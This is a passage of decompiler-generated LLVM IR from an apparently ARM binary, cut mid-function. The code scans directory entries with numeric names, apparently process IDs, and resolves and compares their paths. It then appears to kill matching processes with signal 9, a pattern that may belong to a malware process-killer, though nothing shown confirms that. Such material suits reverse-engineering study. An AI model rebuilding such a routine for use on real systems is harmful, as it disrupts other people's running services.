dec_label_pc_df18:                                ; preds = %bb138, %dec_label_pc_df10
  %v0_df2416 = phi i32 [ %v1_df24, %bb138 ], [ %v1_def0, %dec_label_pc_df10 ]
  %v0_df2818 = phi i32 [ %v1_df28, %bb138 ], [ %v2_df10, %dec_label_pc_df10 ]
  %v1_df18 = add i32 %v0_df2818, 3
  %v2_df18 = inttoptr i32 %v1_df18 to i8*
  %v3_df18 = load i8, i8* %v2_df18, align 1
  %v2_df1c = icmp eq i8 %v3_df18, 0
  br i1 %v2_df1c, label %.thread15, label %bb138

.thread15:                                        ; preds = %dec_label_pc_df18
  %v1_df2417 = add i32 %v0_df2416, 1
  store i32 %v1_df2417, i32* @r5, align 4
  br label %dec_label_pc_df30

bb138:                                            ; preds = %dec_label_pc_df18
  %v8_df20 = icmp eq i8 %v3_df18, 32
  %v1_df24 = add i32 %v0_df2416, 1
  store i32 %v1_df24, i32* @r5, align 4
  %v1_df28 = add i32 %v0_df2818, 1
  br i1 %v8_df20, label %dec_label_pc_df30, label %dec_label_pc_df18

dec_label_pc_df30:                                ; preds = %bb138, %bb137, %.thread15, %.thread13
  %v1_df3c = phi i32 [ %v1_df2417, %.thread15 ], [ %v1_def0, %.thread13 ], [ %v1_def0, %bb137 ], [ %v1_df24, %bb138 ]
  %v0_df30 = load i32, i32* @r6, align 4
  %v2_df30 = add i32 %v0_df30, %v1_def0
  store i32 %v2_df30, i32* @r4, align 4
  %v2_df3c = add i32 %v1_df3c, %v2_def4
  store i32 0, i32* @r7, align 4
  %v3_df44 = add i32 %v2_df3c, -545
  %v4_df44 = inttoptr i32 %v3_df44 to i8*
  store i8 0, i8* %v4_df44, align 1
  %v0_df48 = load i32, i32* @r4, align 4
  %v1_df4c = inttoptr i32 %v0_df48 to i8*
  %v2_df4c = call i32 @function_12480(i8* %v1_df4c)
  store i32 %v2_df4c, i32* @r1, align 4
  %v0_df58 = load i32, i32* @r4, align 4
  %v3_df5c = inttoptr i32 %v0_df58 to i8*
  %v4_df5c = call i32 @function_127d0(i8* %v3_df5c, i32 %v2_df4c, i32 %v2_de34)
  %v7_df60 = icmp eq i32 %v4_df5c, -1
  br i1 %v7_df60, label %dec_label_pc_de94.backedge, label %dec_label_pc_df7c.preheader

dec_label_pc_df7c.preheader:                      ; preds = %dec_label_pc_df30
  %v1_df64 = load i32, i32* @r7, align 4
  %v1_df68 = load i32, i32* @r6, align 4
  %v2_df68 = load i32, i32* @r5, align 4
  %v3_df68 = add i32 %v2_df68, %v1_df68
  store i32 %v1_df64, i32* @lr, align 4
  %v1_df7c49 = add i32 %v3_df68, 2
  %v2_df7c50 = inttoptr i32 %v1_df7c49 to i8*
  %v3_df7c51 = load i8, i8* %v2_df7c50, align 1
  %v2_df8053 = icmp eq i8 %v3_df7c51, 0
  %v1_df8455 = add i32 %v2_df68, 2
  br i1 %v2_df8053, label %dec_label_pc_dfb4, label %dec_label_pc_df8c

dec_label_pc_df8c:                                ; preds = %dec_label_pc_df7c.preheader, %dec_label_pc_df7c.backedge
  %v0_dfb484 = phi i32 [ %v0_dfb482, %dec_label_pc_df7c.backedge ], [ %v1_df64, %dec_label_pc_df7c.preheader ]
  %v0_df9c.pr = phi i32 [ %v0_df9c.pr71, %dec_label_pc_df7c.backedge ], [ %v1_df64, %dec_label_pc_df7c.preheader ]
  %v0_e2c0 = phi i32 [ %v0_e2c074, %dec_label_pc_df7c.backedge ], [ %v1_df64, %dec_label_pc_df7c.preheader ]
  %v0_df8479 = phi i32 [ %v1_df84, %dec_label_pc_df7c.backedge ], [ %v1_df8455, %dec_label_pc_df7c.preheader ]
  %v0_dfac = phi i32 [ %v0_df7c, %dec_label_pc_df7c.backedge ], [ %v3_df68, %dec_label_pc_df7c.preheader ]
  %v1_df90.in = phi i8 [ %v3_df7c, %dec_label_pc_df7c.backedge ], [ %v3_df7c51, %dec_label_pc_df7c.preheader ]
  %v7_df8c = icmp eq i8 %v1_df90.in, 9
  br i1 %v7_df8c, label %bb140, label %bb139

bb139:                                            ; preds = %dec_label_pc_df8c
  %v8_df90 = icmp eq i8 %v1_df90.in, 32
  br i1 %v8_df90, label %.thread27, label %dec_label_pc_df9c

.thread27:                                        ; preds = %bb139
  br label %dec_label_pc_dfa8

bb140:                                            ; preds = %dec_label_pc_df8c
  br label %dec_label_pc_dfa8

dec_label_pc_df9c:                                ; preds = %bb139
  %v7_df9c = icmp eq i32 %v0_df9c.pr, 1
  br i1 %v7_df9c, label %dec_label_pc_e2c0, label %dec_label_pc_dfa4

dec_label_pc_dfa4:                                ; preds = %dec_label_pc_e2c0, %dec_label_pc_df9c
  %v0_dfa876 = phi i32 [ %v1_e2c0, %dec_label_pc_e2c0 ], [ %v0_e2c0, %dec_label_pc_df9c ]
  br label %dec_label_pc_dfa8

dec_label_pc_dfa8:                                ; preds = %bb140, %.thread27, %dec_label_pc_dfa4
  %v0_dfa8 = phi i32 [ %v0_e2c0, %.thread27 ], [ %v0_e2c0, %bb140 ], [ %v0_dfa876, %dec_label_pc_dfa4 ]
  %v0_df9c.pr72 = phi i32 [ 1, %.thread27 ], [ 1, %bb140 ], [ 0, %dec_label_pc_dfa4 ]
  %v7_dfb0 = icmp sgt i32 %v0_dfa8, 6
  br i1 %v7_dfb0, label %dec_label_pc_dfb4, label %dec_label_pc_df7c.backedge

dec_label_pc_dfb4:                                ; preds = %dec_label_pc_df7c.backedge, %dec_label_pc_dfa8, %dec_label_pc_df7c.preheader
  %v1_e004 = phi i32 [ %v1_df8455, %dec_label_pc_df7c.preheader ], [ %v1_df84, %dec_label_pc_df7c.backedge ], [ %v0_df8479, %dec_label_pc_dfa8 ]
  %v0_dfb4 = phi i32 [ %v1_df64, %dec_label_pc_df7c.preheader ], [ %v0_dfb482, %dec_label_pc_df7c.backedge ], [ %v0_dfb484, %dec_label_pc_dfa8 ]
  %v2_dfb4 = icmp eq i32 %v0_dfb4, 0
  br i1 %v2_dfb4, label %dec_label_pc_de94.backedge, label %dec_label_pc_dfc0

dec_label_pc_dfc0:                                ; preds = %dec_label_pc_dfb4
  %v2_dfc8 = add i32 %v1_e004, %v2_def4
  %v1_dfcc = add i32 %v2_dfc8, -545
  %v2_dfcc = inttoptr i32 %v1_dfcc to i8*
  %v3_dfcc = load i8, i8* %v2_dfcc, align 1
  %v2_dfd0 = icmp eq i8 %v3_dfcc, 0
  br i1 %v2_dfd0, label %dec_label_pc_e000, label %bb141

bb141:                                            ; preds = %dec_label_pc_dfc0
  %v8_dfd4 = icmp eq i8 %v3_dfcc, 32
  br i1 %v8_dfd4, label %dec_label_pc_e000, label %dec_label_pc_dfdc

dec_label_pc_dfdc:                                ; preds = %bb141
  %v2_dfdc = add i32 %v1_e004, %v1_df68
  br label %dec_label_pc_dfe0

dec_label_pc_dfe0:                                ; preds = %bb142, %dec_label_pc_dfdc
  %v0_dfec30 = phi i32 [ %v1_dfec, %bb142 ], [ %v1_e004, %dec_label_pc_dfdc ]
  %v0_dfe0 = phi i32 [ %v1_dfe0, %bb142 ], [ %v2_dfdc, %dec_label_pc_dfdc ]
  %v1_dfe0 = add i32 %v0_dfe0, 1
  %v2_dfe0 = inttoptr i32 %v1_dfe0 to i8*
  %v3_dfe0 = load i8, i8* %v2_dfe0, align 1
  %v2_dfe4 = icmp eq i8 %v3_dfe0, 0
  br i1 %v2_dfe4, label %.thread29, label %bb142

.thread29:                                        ; preds = %dec_label_pc_dfe0
  %v1_dfec31 = add i32 %v0_dfec30, 1
  br label %dec_label_pc_dff4

bb142:                                            ; preds = %dec_label_pc_dfe0
  %v8_dfe8 = icmp eq i8 %v3_dfe0, 32
  %v1_dfec = add i32 %v0_dfec30, 1
  br i1 %v8_dfe8, label %dec_label_pc_dff4, label %dec_label_pc_dfe0

dec_label_pc_dff4:                                ; preds = %bb142, %.thread29
  %v1_dffc = phi i32 [ %v1_dfec31, %.thread29 ], [ %v1_dfec, %bb142 ]
  %v2_dffc = add i32 %v1_dffc, %v2_def4
  br label %dec_label_pc_e000

dec_label_pc_e000:                                ; preds = %dec_label_pc_dfc0, %bb141, %dec_label_pc_dff4
  %v2_e00c = phi i32 [ %v2_dfc8, %dec_label_pc_dfc0 ], [ %v2_dfc8, %bb141 ], [ %v2_dffc, %dec_label_pc_dff4 ]
  %v2_e004 = add i32 %v1_e004, %v1_df68
  store i32 %v2_e004, i32* @r4, align 4
  %v3_e00c = add i32 %v2_e00c, -545
  %v4_e00c = inttoptr i32 %v3_e00c to i8*
  store i8 0, i8* %v4_e00c, align 1
  %v1_e010 = inttoptr i32 %v2_e004 to i8*
  %v2_e010 = call i32 @function_12480(i8* %v1_e010)
  %v8_e018 = icmp sgt i32 %v2_e010, 15
  br i1 %v8_e018, label %dec_label_pc_de94.backedge, label %dec_label_pc_e01c

dec_label_pc_e01c:                                ; preds = %dec_label_pc_e000
  %v0_e020 = load i32, i32* @r4, align 4
  %v2_e024 = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_e024, i32* @r0, align 4
  %v2_e028 = bitcast i32* %stack_var_-56 to i8*
  %v3_e028 = call i32 @function_124a8(i8* %v2_e028, i32 %v0_e020)
  br label %dec_label_pc_e02c

dec_label_pc_e02c.loopexit:                       ; preds = %dec_label_pc_de94.backedge, %dec_label_pc_de94.preheader
  %.pre = ptrtoint i32* %stack_var_-56 to i32
  %.pre100 = bitcast i32* %stack_var_-56 to i8*
  br label %dec_label_pc_e02c

dec_label_pc_e02c:                                ; preds = %dec_label_pc_e02c.loopexit, %dec_label_pc_e01c
  %v1_e03c.pre-phi = phi i8* [ %.pre100, %dec_label_pc_e02c.loopexit ], [ %v2_e028, %dec_label_pc_e01c ]
  %v2_e038.pre-phi = phi i32 [ %.pre, %dec_label_pc_e02c.loopexit ], [ %v2_e024, %dec_label_pc_e01c ]
  %v0_e02c = load i32, i32* @r8, align 4
  %v1_e030 = call i32 @function_1314c(i32 %v0_e02c)
  %v2_e03c = call i32 @function_12480(i8* %v1_e03c.pre-phi)
  store i32 %v2_e03c, i32* @r4, align 4
  %v2_e040 = icmp eq i32 %v2_e03c, 0
  br i1 %v2_e040, label %dec_label_pc_e298, label %dec_label_pc_e04c

dec_label_pc_e04c:                                ; preds = %dec_label_pc_e02c
  %v3_e054 = call i32 @function_11b24(i32 6, i32* null)
  %v1_e058 = call i32 @function_13348(i32 %v3_e054)
  store i32 %v1_e058, i32* @sb, align 4
  %v2_e05c = icmp eq i32 %v1_e058, 0
  br i1 %v2_e05c, label %dec_label_pc_e28c, label %dec_label_pc_e06c.preheader

dec_label_pc_e06c.preheader:                      ; preds = %dec_label_pc_e04c
  store i32 0, i32* @r5, align 4
  %v1_e07044 = inttoptr i32 %v1_e058 to i32*
  %v2_e07045 = call i32 @function_1348c(i32* %v1_e07044)
  %v2_e07447 = icmp eq i32 %v2_e07045, 0
  br i1 %v2_e07447, label %dec_label_pc_e280, label %dec_label_pc_e07c.preheader

dec_label_pc_e06c.loopexit:                       ; preds = %dec_label_pc_e084, %dec_label_pc_e094, %dec_label_pc_e100
  %v0_e06c = load i32, i32* @sb, align 4
  %v1_e070 = inttoptr i32 %v0_e06c to i32*
  %v2_e070 = call i32 @function_1348c(i32* %v1_e070)
  %v2_e074 = icmp eq i32 %v2_e070, 0
  br i1 %v2_e074, label %dec_label_pc_e280, label %dec_label_pc_e07c.preheader

dec_label_pc_e07c.preheader:                      ; preds = %dec_label_pc_e06c.preheader, %dec_label_pc_e06c.loopexit
  %v0_e08492 = phi i32 [ %v2_e070, %dec_label_pc_e06c.loopexit ], [ %v2_e07045, %dec_label_pc_e06c.preheader ]
  br label %dec_label_pc_e07c

dec_label_pc_e07c:                                ; preds = %dec_label_pc_e07c.preheader, %dec_label_pc_e268
  %v0_e09c = phi i32 [ %v0_e08492, %dec_label_pc_e07c.preheader ], [ %v2_e274, %dec_label_pc_e268 ]
  %v0_e07c = load i32, i32* @r5, align 4
  %v2_e07c = icmp eq i32 %v0_e07c, 0
  br i1 %v2_e07c, label %dec_label_pc_e084, label %dec_label_pc_e280

dec_label_pc_e084:                                ; preds = %dec_label_pc_e07c
  %v1_e084 = add i32 %v0_e09c, 11
  %v2_e084 = inttoptr i32 %v1_e084 to i8*
  %v3_e084 = load i8, i8* %v2_e084, align 1
  %v4_e084 = zext i8 %v3_e084 to i32
  %v1_e088 = add nsw i32 %v4_e084, -48
  %tmp = icmp ugt i32 %v1_e088, 9
  br i1 %tmp, label %dec_label_pc_e06c.loopexit, label %dec_label_pc_e094

dec_label_pc_e094:                                ; preds = %dec_label_pc_e084
  store i32 %v1_e084, i32* @r7, align 4
  %v3_e0a0 = call i32 @function_11b24(i32 6, i32* null)
  store i32 %v2_de0c, i32* @r0, align 4
  %v3_e0ac = call i32 @function_124a8(i8* %v2_de30, i32 %v3_e0a0)
  %v2_e0b4 = call i32 @function_12480(i8* %v2_de30)
  %v0_e0b8 = load i32, i32* @r7, align 4
  %v1_e0bc = load i32, i32* @sl, align 4
  %v2_e0bc = add i32 %v1_e0bc, %v2_e0b4
  store i32 %v2_e0bc, i32* @r0, align 4
  %v2_e0c0 = inttoptr i32 %v2_e0bc to i8*
  %v3_e0c0 = call i32 @function_124a8(i8* %v2_e0c0, i32 %v0_e0b8)
  %v2_e0c8 = call i32 @function_12480(i8* %v2_de30)
  %v0_e0cc = load i32, i32* @r5, align 4
  store i32 %v2_e0c8, i32* @r4, align 4
  %v2_e0d8 = inttoptr i32 %v0_e0cc to i32*
  %v3_e0d8 = call i32 @function_11b24(i32 7, i32* %v2_e0d8)
  %v0_e0e0 = load i32, i32* @r4, align 4
  %v1_e0e0 = load i32, i32* @sl, align 4
  %v2_e0e0 = add i32 %v1_e0e0, %v0_e0e0
  store i32 %v2_e0e0, i32* @r0, align 4
  %v2_e0e4 = inttoptr i32 %v2_e0e0 to i8*
  %v3_e0e4 = call i32 @function_124a8(i8* %v2_e0e4, i32 %v3_e0d8)
  %v3_e0f4 = call i32 @function_12eb0(i32 %v2_de0c, i32 %v2_ddfc, i32 4096)
  %v7_e0f8 = icmp eq i32 %v3_e0f4, -1
  br i1 %v7_e0f8, label %dec_label_pc_e06c.loopexit, label %dec_label_pc_e100

dec_label_pc_e100:                                ; preds = %dec_label_pc_e094
  %v0_e100 = load i32, i32* @r5, align 4
  %v2_e108 = inttoptr i32 %v0_e100 to i32*
  %v3_e108 = call i32 @function_11b24(i32 6, i32* %v2_e108)
  store i32 %v2_de0c, i32* @r0, align 4
  %v3_e114 = call i32 @function_124a8(i8* %v2_de30, i32 %v3_e108)
  %v2_e11c = call i32 @function_12480(i8* %v2_de30)
  %v0_e120 = load i32, i32* @r7, align 4
  %v1_e124 = load i32, i32* @sl, align 4
  %v2_e124 = add i32 %v1_e124, %v2_e11c
  store i32 %v2_e124, i32* @r0, align 4
  %v2_e128 = inttoptr i32 %v2_e124 to i8*
  %v3_e128 = call i32 @function_124a8(i8* %v2_e128, i32 %v0_e120)
  %v2_e130 = call i32 @function_12480(i8* %v2_de30)
  %v0_e134 = load i32, i32* @r5, align 4
  store i32 %v2_e130, i32* @r4, align 4
  %v2_e140 = inttoptr i32 %v0_e134 to i32*
  %v3_e140 = call i32 @function_11b24(i32 9, i32* %v2_e140)
  %v0_e148 = load i32, i32* @r4, align 4
  %v1_e148 = load i32, i32* @sl, align 4
  %v2_e148 = add i32 %v1_e148, %v0_e148
  store i32 %v2_e148, i32* @r0, align 4
  %v2_e14c = inttoptr i32 %v2_e148 to i8*
  %v3_e14c = call i32 @function_124a8(i8* %v2_e14c, i32 %v3_e140)
  %v1_e154 = call i32 @function_13348(i32 %v2_de0c)
  store i32 %v1_e154, i32* @r8, align 4
  %v2_e158 = icmp eq i32 %v1_e154, 0
  br i1 %v2_e158, label %dec_label_pc_e06c.loopexit, label %dec_label_pc_e160.preheader

dec_label_pc_e160.preheader:                      ; preds = %dec_label_pc_e100
  %v1_e16439 = inttoptr i32 %v1_e154 to i32*
  %v2_e16440 = call i32 @function_1348c(i32* %v1_e16439)
  store i32 %v2_e16440, i32* @r6, align 4
  %v2_e16842 = icmp eq i32 %v2_e16440, 0
  br i1 %v2_e16842, label %dec_label_pc_e268, label %dec_label_pc_e178thread-pre-split

dec_label_pc_e160.loopexit:                       ; preds = %dec_label_pc_e180, %dec_label_pc_e218
  %v0_e160 = load i32, i32* @r8, align 4
  %v1_e164 = inttoptr i32 %v0_e160 to i32*
  %v2_e164 = call i32 @function_1348c(i32* %v1_e164)
  store i32 %v2_e164, i32* @r6, align 4
  %v2_e168 = icmp eq i32 %v2_e164, 0
  br i1 %v2_e168, label %dec_label_pc_e268, label %dec_label_pc_e178thread-pre-split

dec_label_pc_e178thread-pre-split:                ; preds = %dec_label_pc_e160.preheader, %dec_label_pc_e160.loopexit
  %v0_e178.pr = load i32, i32* @r5, align 4
  br label %dec_label_pc_e178

dec_label_pc_e178:                                ; preds = %dec_label_pc_e178thread-pre-split, %dec_label_pc_e240
  %v0_e178 = phi i32 [ %v0_e178.pr, %dec_label_pc_e178thread-pre-split ], [ 1, %dec_label_pc_e240 ]
  %v2_e178 = icmp eq i32 %v0_e178, 0
  br i1 %v2_e178, label %dec_label_pc_e180, label %dec_label_pc_e268

dec_label_pc_e180:                                ; preds = %dec_label_pc_e178
  %v2_e180 = call i32 @function_12514(i32 %v2_ddfc, i32 4096)
  %v0_e184 = load i32, i32* @r5, align 4
  %v2_e18c = inttoptr i32 %v0_e184 to i32*
  %v3_e18c = call i32 @function_11b24(i32 6, i32* %v2_e18c)
  store i32 %v2_de0c, i32* @r0, align 4
  %v3_e198 = call i32 @function_124a8(i8* %v2_de30, i32 %v3_e18c)
  %v2_e1a0 = call i32 @function_12480(i8* %v2_de30)
  %v0_e1a4 = load i32, i32* @r7, align 4
  %v1_e1a8 = load i32, i32* @sl, align 4
  %v2_e1a8 = add i32 %v1_e1a8, %v2_e1a0
  store i32 %v2_e1a8, i32* @r0, align 4
  %v2_e1ac = inttoptr i32 %v2_e1a8 to i8*
  %v3_e1ac = call i32 @function_124a8(i8* %v2_e1ac, i32 %v0_e1a4)
  %v2_e1b4 = call i32 @function_12480(i8* %v2_de30)
  %v0_e1b8 = load i32, i32* @r5, align 4
  store i32 %v2_e1b4, i32* @r4, align 4
  %v2_e1c4 = inttoptr i32 %v0_e1b8 to i32*
  %v3_e1c4 = call i32 @function_11b24(i32 9, i32* %v2_e1c4)
  %v0_e1cc = load i32, i32* @r4, align 4
  %v1_e1cc = load i32, i32* @sl, align 4
  %v2_e1cc = add i32 %v1_e1cc, %v0_e1cc
  store i32 %v2_e1cc, i32* @r0, align 4
  %v2_e1d0 = inttoptr i32 %v2_e1cc to i8*
  %v3_e1d0 = call i32 @function_124a8(i8* %v2_e1d0, i32 %v3_e1c4)
  %v2_e1d8 = call i32 @function_12480(i8* %v2_de30)
  %v1_e1e0 = load i32, i32* @sl, align 4
  %v2_e1e0 = add i32 %v1_e1e0, %v2_e1d8
  store i32 %v2_e1e0, i32* @r0, align 4
  %v2_e1e4 = inttoptr i32 %v2_e1e0 to i8*
  %v3_e1e4 = call i32 @function_124a8(i8* %v2_e1e4, i32 ptrtoint (i32* @global_var_18510.19 to i32))
  %v2_e1ec = call i32 @function_12480(i8* %v2_de30)
  %v0_e1f0 = load i32, i32* @r6, align 4
  %v1_e1f0 = add i32 %v0_e1f0, 11
  %v1_e1f4 = load i32, i32* @sl, align 4
  %v2_e1f4 = add i32 %v1_e1f4, %v2_e1ec
  store i32 %v2_e1f4, i32* @r0, align 4
  %v2_e1f8 = inttoptr i32 %v2_e1f4 to i8*
  %v3_e1f8 = call i32 @function_124a8(i8* %v2_e1f8, i32 %v1_e1f0)
  %v3_e208 = call i32 @function_12eb0(i32 %v2_de0c, i32 %v2_ddfc, i32 4096)
  %v7_e20c = icmp eq i32 %v3_e208, -1
  br i1 %v7_e20c, label %dec_label_pc_e160.loopexit, label %dec_label_pc_e218

dec_label_pc_e218:                                ; preds = %dec_label_pc_e180
  %v2_e218 = call i32 @function_12480(i8* %v2_de1c)
  store i32 %v2_e218, i32* @r1, align 4
  %v4_e22c = call i32 @function_127d0(i8* %v2_de1c, i32 %v2_e218, i32 %v2_e038.pre-phi)
  %v7_e230 = icmp eq i32 %v4_e22c, -1
  br i1 %v7_e230, label %dec_label_pc_e160.loopexit, label %dec_label_pc_e240

dec_label_pc_e240:                                ; preds = %dec_label_pc_e218
  %v0_e238 = load i32, i32* @r7, align 4
  %v2_e240 = inttoptr i32 %v0_e238 to i8*
  %v3_e240 = call i32 @function_125a4(i8* %v2_e240, i32 10)
  %v2_e248 = call i32 @function_12f18(i32 %v3_e240, i32 9)
  %v0_e24c = load i32, i32* @r8, align 4
  %v1_e250 = inttoptr i32 %v0_e24c to i32*
  %v2_e250 = call i32 @function_1348c(i32* %v1_e250)
  store i32 %v2_e250, i32* @r6, align 4
  %v2_e254 = icmp eq i32 %v2_e250, 0
  store i32 1, i32* @r5, align 4
  br i1 %v2_e254, label %dec_label_pc_e268, label %dec_label_pc_e178

dec_label_pc_e268:                                ; preds = %dec_label_pc_e160.loopexit, %dec_label_pc_e240, %dec_label_pc_e178, %dec_label_pc_e160.preheader
  %v0_e268 = load i32, i32* @r8, align 4
  %v1_e26c = inttoptr i32 %v0_e268 to i32*
  %v2_e26c = call i32 @function_13180(i32* %v1_e26c)
  %v0_e270 = load i32, i32* @sb, align 4
  %v1_e274 = inttoptr i32 %v0_e270 to i32*
  %v2_e274 = call i32 @function_1348c(i32* %v1_e274)
  %v2_e278 = icmp eq i32 %v2_e274, 0
  br i1 %v2_e278, label %dec_label_pc_e280, label %dec_label_pc_e07c

dec_label_pc_e280:                                ; preds = %dec_label_pc_e06c.loopexit, %dec_label_pc_e268, %dec_label_pc_e07c, %dec_label_pc_e06c.preheader
  %v0_e280 = load i32, i32* @sb, align 4
  %v1_e284 = inttoptr i32 %v0_e280 to i32*
  %v2_e284 = call i32 @function_13180(i32* %v1_e284)
  %v0_e288 = load i32, i32* @r5, align 4
  %v1_e288 = urem i32 %v0_e288, 256
  br label %dec_label_pc_e28c

dec_label_pc_e28c:                                ; preds = %dec_label_pc_e04c, %dec_label_pc_e280
  %storemerge = phi i32 [ %v1_e288, %dec_label_pc_e280 ], [ 0, %dec_label_pc_e04c ]
  store i32 %storemerge, i32* @r4, align 4
  %v1_e290 = call i32 @function_1524c(i32 1)
  br label %dec_label_pc_e298

dec_label_pc_e298:                                ; preds = %dec_label_pc_e02c, %dec_label_pc_e28c
  %v1_e298 = call i32 @function_11b48(i32 6)
  %v1_e2a0 = call i32 @function_11b48(i32 7)
  %v1_e2a8 = call i32 @function_11b48(i32 9)
  %v0_e2ac.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_e2ac

dec_label_pc_e2ac:                                ; preds = %bb, %dec_label_pc_e298
  %v0_e2ac = phi i32 [ %v1_de8c, %bb ], [ %v0_e2ac.pre, %dec_label_pc_e298 ]
  store i32 %v3_ddb4, i32* @r4, align 4
  store i32 %v6_ddb4, i32* @r5, align 4
  store i32 %v9_ddb4, i32* @r6, align 4
  store i32 %v12_ddb4, i32* @r7, align 4
  store i32 %v15_ddb4, i32* @r8, align 4
  store i32 %v18_ddb4, i32* @sb, align 4
  store i32 %v21_ddb4, i32* @sl, align 4
  store i32 %v24_ddb4, i32* @fp, align 4
  store i32 %v27_ddb4, i32* @lr, align 4
  ret i32 %v0_e2ac

dec_label_pc_e2c0:                                ; preds = %dec_label_pc_df9c
  %v1_e2c0 = add i32 %v0_e2c0, 1
  %v7_e2c4 = icmp eq i32 %v0_e2c0, 0
  br i1 %v7_e2c4, label %dec_label_pc_e2cc, label %dec_label_pc_dfa4

dec_label_pc_e2cc:                                ; preds = %dec_label_pc_e2c0
  %v1_e2cc = add i32 %v0_dfac, 3
  %v2_e2cc = inttoptr i32 %v1_e2cc to i8*
  %v3_e2cc = load i8, i8* %v2_e2cc, align 1
  %v7_e2d0 = icmp eq i8 %v3_e2cc, 65
  br i1 %v7_e2d0, label %dec_label_pc_e2e4, label %dec_label_pc_e2d8

dec_label_pc_e2d8:                                ; preds = %dec_label_pc_e2cc, %dec_label_pc_e2e4
  %v0_dfb483 = phi i32 [ %v0_dfb484, %dec_label_pc_e2cc ], [ 1, %dec_label_pc_e2e4 ]
  br label %dec_label_pc_df7c.backedge

dec_label_pc_df7c.backedge:                       ; preds = %dec_label_pc_e2d8, %dec_label_pc_dfa8
  %v0_dfb482 = phi i32 [ %v0_dfb483, %dec_label_pc_e2d8 ], [ %v0_dfb484, %dec_label_pc_dfa8 ]
  %v0_e2c074 = phi i32 [ %v1_e2c0, %dec_label_pc_e2d8 ], [ %v0_dfa8, %dec_label_pc_dfa8 ]
  %v0_df9c.pr71 = phi i32 [ 0, %dec_label_pc_e2d8 ], [ %v0_df9c.pr72, %dec_label_pc_dfa8 ]
  %v0_df7c = add i32 %v0_dfac, 1
  %v1_df7c = add i32 %v0_dfac, 3
  %v2_df7c = inttoptr i32 %v1_df7c to i8*
  %v3_df7c = load i8, i8* %v2_df7c, align 1
  %v2_df80 = icmp eq i8 %v3_df7c, 0
  %v1_df84 = add i32 %v0_df8479, 1
  br i1 %v2_df80, label %dec_label_pc_dfb4, label %dec_label_pc_df8c

dec_label_pc_e2e4:                                ; preds = %dec_label_pc_e2cc
  store i32 1, i32* @lr, align 4
  br label %dec_label_pc_e2d8

dec_label_pc_e2ec:                                ; preds = %dec_label_pc_ddb4
  store i8 48, i8* %stack_var_-72, align 1
  br label %dec_label_pc_de60

; uselistorder directives
  uselistorder i32 %v1_df84, { 1, 0 }
  uselistorder i8 %v3_df7c, { 1, 0 }
  uselistorder i32 %v0_dfb482, { 1, 0 }
  uselistorder i32 %v1_e2c0, { 1, 0 }
  uselistorder i32 %v2_e274, { 1, 0 }
  uselistorder i32 %v1_dfe0, { 1, 0 }
  uselistorder i32 %v0_dfec30, { 1, 0 }
  uselistorder i32 %v1_e004, { 0, 3, 1, 2 }
  uselistorder i32 %v0_dfa8, { 1, 0 }
  uselistorder i32 %v0_df8479, { 1, 0 }
  uselistorder i32 %v0_e2c0, { 4, 3, 0, 1, 2 }
  uselistorder i32 %v0_dfb484, { 1, 2, 0 }
  uselistorder i32 %v1_df8455, { 1, 0 }
  uselistorder i32 %v2_df68, { 1, 0 }
  uselistorder i32 %v1_df64, { 3, 1, 0, 2, 4 }
  uselistorder i32 %v1_df24, { 0, 2, 1 }
  uselistorder i32 %v0_df2416, { 1, 0 }
  uselistorder i32 %v1_def0, { 0, 2, 3, 4, 5, 6, 1 }
  uselistorder i32 %v3_de80, { 1, 2, 0 }
  uselistorder i32 %v0_de38, { 1, 0 }
  uselistorder i32 %v2_de34, { 1, 0, 2 }
  uselistorder i8* %v2_de1c, { 1, 0, 2 }
  uselistorder i32 %v2_ddfc, { 1, 0, 2, 3 }
  uselistorder i8* %stack_var_-585, { 1, 4, 0, 2, 3 }
  uselistorder i8* %stack_var_-72, { 2, 0, 1 }
  uselistorder i32* %stack_var_-56, { 0, 1, 2, 4, 3 }
  uselistorder i32 (i8*, i32, i32)* @function_126e0, { 1, 0 }
  uselistorder label %dec_label_pc_e2d8, { 1, 0 }
  uselistorder label %dec_label_pc_e2ac, { 1, 0 }
  uselistorder label %dec_label_pc_e298, { 1, 0 }
  uselistorder label %dec_label_pc_e28c, { 1, 0 }
  uselistorder label %dec_label_pc_e280, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_e268, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_e178, { 1, 0 }
  uselistorder label %dec_label_pc_e178thread-pre-split, { 1, 0 }
  uselistorder label %dec_label_pc_e160.loopexit, { 1, 0 }
  uselistorder label %dec_label_pc_e07c, { 1, 0 }
  uselistorder label %dec_label_pc_e07c.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_e06c.loopexit, { 2, 1, 0 }
  uselistorder label %dec_label_pc_e000, { 2, 1, 0 }
  uselistorder label %dec_label_pc_dfa8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_df8c, { 1, 0 }
  uselistorder label %dec_label_pc_df30, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_de94.backedge, { 2, 1, 3, 0 }
  uselistorder label %dec_label_pc_dee4, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_deac, { 1, 0 }
  uselistorder label %dec_label_pc_de60, { 1, 0 }
}

define i32 @function_e31c(i32 %arg1) local_unnamed_addr {
dec_label_pc_e31c:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %stack_var_-8412 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-220 = alloca i32, align 4
  %stack_var_-156 = alloca i32, align 4
  %stack_var_-92 = alloca i32, align 4
  %stack_var_-4264 = alloca i32, align 4
  %stack_var_-76 = alloca i32, align 4
  %stack_var_-248 = alloca i32, align 4
  %v6_e31c = load i32, i32* @r5, align 4
  %v2_e32c = call i32 @function_12d98(i32* null)
  store i32 %v2_e32c, i32* @r0, align 4
  store i32 %v2_e32c, i32* @r7, align 4
  %v0_e334 = call i32 @function_12e08()
  %v7_e338 = icmp eq i32 %v0_e334, -1
  %. = zext i1 %v7_e338 to i32
  %tmp220 = icmp slt i32 %v0_e334, 1
  %storemerge184 = select i1 %tmp220, i32 %., i32 1
  store i32 %storemerge184, i32* @r5, align 4
  store i32 ptrtoint (i32* @global_var_2339c.99 to i32), i32* %r3.global-to-local, align 4
  %v2_e354 = icmp eq i32 %storemerge184, 0
